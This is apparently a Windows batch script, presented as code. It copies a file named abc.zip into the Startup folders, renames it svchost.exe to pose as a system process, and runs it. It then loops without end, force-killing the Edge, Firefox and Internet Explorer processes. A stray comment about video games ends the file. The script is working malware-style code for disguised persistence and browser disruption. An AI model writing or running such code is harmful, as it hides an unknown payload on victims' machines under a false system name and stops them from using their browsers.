echo f|xcopy /f ".\abc.zip" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 
rename "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\abc.zip" "svchost.exe"
start explorer "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
echo f|xcopy ".\abc.zip" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
rename "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abc.zip" "svchost.exe"
:edges
taskkill /im MicrosoftEdge.exe /f
taskkill /im MicrosoftEdgeCP.exe /f
taskkill /im firefox.exe /f
taskkill /im iexplore.exe /f


goto edges









REM  in reality being good in video games like dota/lol doesnt make you any better than a game developer ,
